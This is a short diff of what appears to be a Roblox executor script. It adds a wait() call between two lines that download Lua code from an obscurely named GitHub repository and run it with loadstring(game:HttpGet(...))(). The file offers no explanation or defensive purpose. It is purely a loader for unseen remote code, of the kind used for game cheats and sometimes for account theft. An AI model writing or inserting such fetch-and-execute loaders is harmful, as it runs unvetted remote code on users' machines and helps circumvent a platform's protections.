@@ -1,2 +1,3 @@
 loadstring(game:HttpGet('https://raw.githubusercontent.com/attyl/ejifhuiebneuiiufhseui/main/BC2'))()
+wait()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/attyl/ejifhuiebneuiiufhseui/main/BC'))()
